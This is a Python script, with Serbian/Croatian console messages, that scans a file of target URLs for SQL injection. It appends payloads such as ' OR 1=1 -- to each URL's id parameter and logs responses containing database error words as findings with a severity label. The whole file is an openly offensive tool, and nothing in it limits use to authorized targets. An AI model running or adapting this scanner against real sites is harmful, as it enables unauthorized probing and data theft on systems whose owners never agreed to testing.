import requests
import os
from datetime import datetime

SQL_PAYLOADS = ["", "' OR 1=1 --", "\" OR \"1\"=\"1", "' OR '1'='1"]

def load_targets(file_path="targets/targets.txt"):
    with open(file_path, "r") as f:
        return [line.strip() for line in f if line.strip()]

def classify_severity(result: str) -> str:
    result = result.lower()
    if "sql" in result or "auth bypass" in result:
        return "Critical"
    elif "idor" in result or "rfi" in result:
        return "High"
    elif "lfi" in result or "xss" in result:
        return "Medium"
    elif "refleksije" in result or "parametar" in result:
        return "Low"
    return "Unknown"

def log_to_txt(filename, content):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("results/sql_log.txt", "a") as f:
        f.write(f"\n=== {filename} | {timestamp} ===\n{content}\n")

def test_sql_injection(base_url):
    findings = []
    for payload in SQL_PAYLOADS:
        test_url = f"{base_url}?id={payload}" if "?" not in base_url else f"{base_url}{payload}"
        print(f"[+] Testiram: {test_url}")
        try:
            r = requests.get(test_url, timeout=5)
            if any(x in r.text.lower() for x in ["sql", "syntax", "mysql", "query"]):
                print(f"[!] Mogući SQLi: {test_url}")
                findings.append(test_url)
        except Exception as e:
            print(f"[-] Greška: {e}")
    return findings

def run_sql_injection_scan():
    print("[~] Pokrećem SQL Injection test...")
    targets = load_targets()
    for url in targets:
        found = test_sql_injection(url)
        if found:
            severity = classify_severity("\n".join(found))
            log_to_txt(__file__, "\n".join(found) + f" | Severity: {severity}")

if __name__ == "__main__":
    run_sql_injection_scan()
